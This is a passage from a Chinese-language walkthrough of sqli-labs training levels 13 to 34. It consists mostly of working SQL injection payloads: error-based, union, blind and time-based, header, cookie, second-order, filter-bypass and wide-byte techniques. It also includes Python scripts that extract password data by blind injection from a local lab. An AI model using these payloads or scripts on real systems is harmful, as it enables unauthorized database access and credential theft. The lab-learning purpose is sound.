<p>但是这题没有回显数据，可以使用报错注入或者延时盲注</p>
<p>注入的payload</p>
<div class="hljs"><pre><code class="hljs mysql">uname&#x3D; sa&#39;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

    uname&#x3D; dsad&#39;) union select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit
　　　　uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

　　　　uname&#x3D; asd&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

　　　　uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

　　　　uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit

　　　　uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit</code></pre></div>

<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>这一关就是和上面的闭合方式不一样，稍加修改即可</p>
<div class="hljs"><pre><code class="hljs n1ql">uname= sad&quot; union <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a # &amp;passwd= <span class="hljs-string">&#x27;) or 1=1 # &amp;submit=Submit</span></code></pre></div>

<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>这是单引号闭合的布尔盲注，POST型</p>
<p>判断依据可以根据页面出现的图片</p>
<p>登录不成功时出现的图片</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421195038499.png" srcset="/img/loading.gif" alt="image-20210421195038499" style="zoom:50%;">

<p>登录成功的图片</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421195111446.png" srcset="/img/loading.gif" alt="image-20210421195111446" style="zoom:50%;">



<p>这里使用时间盲注</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/4/21 19:54</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : level15.py</span>

<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-15/&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
data = &#123;<span class="hljs-string">&#x27;uname&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;sad&#x27;</span>,<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;Submit&#x27;</span>&#125;
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):

        <span class="hljs-comment"># payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;admin&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(5),null)--+&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        t1 = datetime.datetime.now()
        data[<span class="hljs-string">&#x27;uname&#x27;</span>] = payload
        response = requests.post(url=url,data=data)

        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">5</span>:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
        print(flag)

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre></div>

<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>将上一关的脚本该给双引号闭合即可</p>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>updata注入</p>
<p>可以使用报错注入</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>)#&amp;submit=Submit</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421202328557.png" srcset="/img/loading.gif" alt="image-20210421202328557"></p>
<h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>uname和passwd都使用check_input过滤，而在这里将user-agent和ip作为记录，插入数据库</p>
<p>提示了ip地址和user-Agent，应该时http头注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421202421443.png" srcset="/img/loading.gif" alt="image-20210421202421443"></p>
<p>抓包后，在user-agent的位置插入注入语句</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>) and <span class="hljs-number">1</span>=&#x27;<span class="hljs-number">1</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203429860.png" srcset="/img/loading.gif" alt="image-20210421203429860"></p>
<h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203658570.png" srcset="/img/loading.gif" alt="image-20210421203658570"></p>
<p>登录后提示了referer，应该是在referer头注入</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database())),<span class="hljs-number">1</span>) and <span class="hljs-number">1</span>=&#x27;<span class="hljs-number">1</span>
</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421203948670.png" srcset="/img/loading.gif" alt="image-20210421203948670"></p>
<h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><p>正常登录，发现一个cookie字段</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421204122118.png" srcset="/img/loading.gif" alt="image-20210421204122118"></p>
<p>尝试cookie位置注入</p>
<p>这里直接使用union联合查询即可</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421204741263.png" srcset="/img/loading.gif" alt="image-20210421204741263"></p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-adm&#x27; union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()#

<span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#

<span class="hljs-attribute">uname</span>=-ada&#x27; union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users#</code></pre></div>

<h2 id="level21"><a href="#level21" class="headerlink" title="level21"></a>level21</h2><p>这一关和上一关就是加了一层base64编码，所以可以直接用上面的注入编码后提交</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205159215.png" srcset="/img/loading.gif" alt="image-20210421205159215"></p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-as&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#
<span class="hljs-attribute">uname</span>=LWFzJyB<span class="hljs-number">1</span>bmlvbiBzZWxlY<span class="hljs-number">3</span>QgMSwyLDMj</code></pre></div>

<p>但是出现报错</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205525074.png" srcset="/img/loading.gif" alt="image-20210421205525074" style="zoom:67%;">

<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-as&#x27;) union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#
<span class="hljs-attribute">uname</span>=LWFzJykgdW<span class="hljs-number">5</span>pb<span class="hljs-number">24</span>gc<span class="hljs-number">2</span>VsZWN<span class="hljs-number">0</span>IDEsMiwzIw==</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421205624679.png" srcset="/img/loading.gif" alt="image-20210421205624679" style="zoom:50%;">

<p>所以只要将上面的sql语句修改闭合方式再编码提交即可</p>
<h2 id="level22"><a href="#level22" class="headerlink" title="level22"></a>level22</h2><p>基于错误的双引号字符型Cookie注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210142530.png" srcset="/img/loading.gif" alt="image-20210421210142530"></p>
<p>这里只要将21关的双引号换成双引号，再base64编码</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=-as&quot; union select 1,2,3#
<span class="hljs-attribute">uname</span>=LWFzIiB1bmlvbiBzZWxlY3QgMSwyLDMj</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210212614.png" srcset="/img/loading.gif" alt="image-20210421210212614"></p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=-ada&#x27; union select <span class="hljs-number">1</span>,group_concat(password),<span class="hljs-number">3</span> from users--+ 
<span class="hljs-attribute">uname</span>=LWFkYSIgdW<span class="hljs-number">5</span>pb<span class="hljs-number">24</span>gc<span class="hljs-number">2</span>VsZWN<span class="hljs-number">0</span>IDEsZ<span class="hljs-number">3</span>JvdXBfY<span class="hljs-number">29</span>uY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>KHBhc<span class="hljs-number">3</span>N<span class="hljs-number">3</span>b<span class="hljs-number">3</span>JkKSwzIGZyb<span class="hljs-number">20</span>gdXNlcnMj</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421210330135.png" srcset="/img/loading.gif" alt="image-20210421210330135"></p>
<h2 id="level23"><a href="#level23" class="headerlink" title="level23"></a>level23</h2><p>根据提示可以知道是get型注入</p>
<p>但是但输入</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #
<span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> --+
<span class="hljs-attribute">2</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> %<span class="hljs-number">23</span></code></pre></div>

<p>都会出现语法错误，猜测应该是 <code>#, --</code>两个注释符被过滤了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507090028666.png" srcset="/img/loading.gif" alt="image-20210507090028666"></p>
<p>里我们需要一个特殊的注释符：;%00或者and和or语句进行闭合</p>
<p>payload:    </p>
<div class="hljs"><pre><code class="hljs reasonml">?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">concat_ws</span>(0x7e,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>)</span>) from security.users ;%<span class="hljs-number">00</span></code></pre></div>

<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507090258902.png" srcset="/img/loading.gif" alt="image-20210507090258902"></p>
<h2 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h2><p><strong>二次注入</strong></p>
<blockquote>
<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p>二次注入，可以概括为以下两步:</p>
<p>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
<p>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
</blockquote>
<p>正常用户admin可以正常登录，但是这里需要注册一个非正常的恶意用户，向数据库中插入恶意数据，来修个正常用户admin的密码</p>
<div class="hljs"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin’<span class="hljs-meta"># </span>
<span class="hljs-symbol">password:</span> 任意</code></pre></div>

<p>注册完后可以使用该账号登录</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507091708950.png" srcset="/img/loading.gif" alt="image-20210507091708950"></p>
<p>登录后可以更改用户的密码，此时可以随意修改密码，那么admin用户的密码就会被改成改密码</p>
<p>看看源码，分析原理</p>
<div class="hljs"><pre><code class="hljs PHP"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;
<span class="hljs-variable">$res</span> = mysql_query(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</code></pre></div>

<p>将用户名和密码带入</p>
<div class="hljs"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> #<span class="hljs-string">&#x27; and password=&#x27;</span>$curr_pass<span class="hljs-string">&#x27; &quot;;</span></code></pre></div>

<p>可以看到真正的sql语句为</p>
<div class="hljs"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span></code></pre></div>

<p>这杨就导致了admin用户密码被改变。</p>
<h2 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h2><p>这一关尝试可以发现，是将or和and替换成空</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507093512147.png" srcset="/img/loading.gif" alt="image-20210507093512147"></p>
<p>但是可以直接使用双写绕过，因为它只过滤了一次</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507093742004.png" srcset="/img/loading.gif" alt="image-20210507093742004"></p>
<p>所以还是可以使用union注入，就是要注意or和and单词需要双写。</p>
<h2 id="level25a"><a href="#level25a" class="headerlink" title="level25a"></a>level25a</h2><p>这一关和上一关一样是过滤了or和and，可以使用双写绕过，但是需要使用盲注</p>
<p>可以使用level8使用的脚本，对其payload稍加修改即可</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-25a/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
t = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1 aandnd ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.foorrmat(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1 aandnd (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from infoorrmation_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1 aandnd (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1 aandnd (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)

        response = requests.get(url+payload)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-comment"># print(mid)</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre></div>



<h2 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h2><p>26与上一关相比，很类似，空格，注释符和 / 也给过滤了</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507094649645.png" srcset="/img/loading.gif" alt="image-20210507094649645" style="zoom:50%;">

<p>对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法：</p>
<div class="hljs"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> TAB键（水平）
<span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> 新建一行
<span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> 新的一页
<span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return功能
<span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> TAB键（垂直）
<span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符)</code></pre></div>

<p>可以使用报错注入或者盲注</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;||left(database(),<span class="hljs-number">1</span>)&gt;&#x27;s&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>	
<span class="hljs-attribute">0</span>&#x27;||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(Select%<span class="hljs-number">0</span>a@@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)||&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span></code></pre></div>

<h2 id="level26a"><a href="#level26a" class="headerlink" title="level26a"></a>level26a</h2><p>与上一关一样，题目提示空格与注释被过滤了，可以使用<code>%a0</code>绕过，报错注入不出，可以用布尔盲注</p>
<div class="hljs"><pre><code class="hljs perl"><span class="hljs-number">0</span><span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>	<span class="hljs-comment">#探测为&#x27;</span>
<span class="hljs-number">0</span><span class="hljs-string">&#x27;||left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27;%26%26&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>

白盒审计知道是<span class="hljs-string">&#x27;)</span>
<span class="hljs-string">0%27)%a0union%a0select%a01,database(),2||(&#x27;</span><span class="hljs-number">1</span>
<span class="hljs-number">0</span>%27)%a0union%a0select%a01,database(),<span class="hljs-number">2</span>;%00</code></pre></div>

<h2 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h2><p>题目提示<code>union</code>与<code>select</code>被过滤了，但是没有使用<code>preg_ireplace()</code>,所以可用大小写绕过</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095131602.png" srcset="/img/loading.gif" alt="image-20210507095131602" style="zoom:50%;">

<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;||&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>
<span class="hljs-attribute">0</span>&#x27;||left(database(),<span class="hljs-number">1</span>)=&#x27;s&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>

<span class="hljs-attribute">0</span>&#x27;%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A<span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></code></pre></div>

<h2 id="level27a"><a href="#level27a" class="headerlink" title="level27a"></a>level27a</h2><p>与27关基本一样，就是在id参数位置没有使用单引号闭合</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095515296.png" srcset="/img/loading.gif" alt="image-20210507095515296"></p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095524859.png" srcset="/img/loading.gif" alt="image-20210507095524859"></p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A<span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></code></pre></div>

<h2 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h2><p><code>union select</code>大小写均被过滤，但是<code>select</code>还可单独用，盲注即可，注意这里的id闭合方式为<code>(&#39;&#39;)</code></p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095639166.png" srcset="/img/loading.gif" alt="image-20210507095639166" style="zoom:50%;">

<div class="hljs"><pre><code class="hljs matlab"><span class="hljs-number">0</span>&#x27;)||left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">%00</span></code></pre></div>

<h2 id="level28a"><a href="#level28a" class="headerlink" title="level28a"></a>level28a</h2><p>与28关相比，简单很多，只是过滤了<code>union select</code>,所以可以继续使用上面的payload</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095853009.png" srcset="/img/loading.gif" alt="image-20210507095853009" style="zoom:50%;">

<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;)||left((database()),<span class="hljs-number">1</span>)=&#x27;s&#x27;;%<span class="hljs-number">00</span>
<span class="hljs-attribute">0</span>&#x27;)||left((selEct%<span class="hljs-number">0</span>agroup_concat(schema_name)%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata),<span class="hljs-number">1</span>)&lt;&#x27;s&#x27;;%<span class="hljs-number">00</span></code></pre></div>

<h2 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h2><p>利用<code>tomcat</code>与<code>apache</code>解析相同请求参数不同的特性，<code>tomcat</code>解析相同请求参数取第一个，而<code>apache</code>取第二个，如<code>?id=1&amp;id=2</code>，<code>tomcat</code>取得1，<code>apache</code>取得2</p>
<div class="hljs"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;%<span class="hljs-number">23</span></code></pre></div>

<h2 id="level30"><a href="#level30" class="headerlink" title="level30"></a>level30</h2><p>与 29 架构一样，原理一致只不过加了<code>&quot;</code>限制</p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot; union selEct 1,group_concat(schema_name),2 <span class="hljs-keyword">from</span> information_schema.schemata;%23</code></pre></div>

<h2 id="level31"><a href="#level31" class="headerlink" title="level31"></a>level31</h2><p>架构一样，多了<code>&quot;)</code></p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot;) union selEct 1,group_concat(schema_name),2 <span class="hljs-keyword">from</span> information_schema.schemata;%23</code></pre></div>

<h2 id="level32"><a href="#level32" class="headerlink" title="level32"></a>level32</h2><p>注意是<code>GBK</code>，可以用<code>%df</code>进行宽字节注入</p>
<p>宽字节注入</p>
<p>宽字节注入利用了mysql一个特性，<strong>即当mysql在使用GBK编码的时候，会认为两个字符是一个汉字</strong>。（前一个ASCII码<strong>要大于128</strong>，才到汉字的范围）</p>
<p>先了解一下这些字符的url编码：</p>
<p><img src="https://segmentfault.com/img/bVbzjiJ" srcset="/img/loading.gif" alt="image.png"></p>
<p>当输入单引号，经addslashes转义后，对应的url编码是：<br><strong>‘ –&gt; &#39; –&gt; %5C%27</strong><br>当在前面引入一个ASCII大于128的字符（比如%df），url编码变为：<br><strong>%df –&gt; %df \ ‘ –&gt; （%df%5C）%27</strong></p>
<p>若使用gbk编码的话，<strong>%df%5C会被当作一个汉字处理</strong>，从而使%27（单引号）逃出生天，成功绕过</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%df%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span>
<span class="hljs-attribute">0</span>%df&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></code></pre></div>

<h2 id="level33"><a href="#level33" class="headerlink" title="level33"></a>level33</h2><p>与32相同</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%df&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></code></pre></div>

<h2 id="level34"><a href="#level34" class="headerlink" title="level34"></a>level34</h2><p>这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16/utf-32编码绕过，即将<code>&#39;</code>转为utf-16为 <code>�&#39;</code></p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: <span class="hljs-number">1</span>�&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#
<span class="hljs-attribute">Password</span>: 任意</code></pre></div>



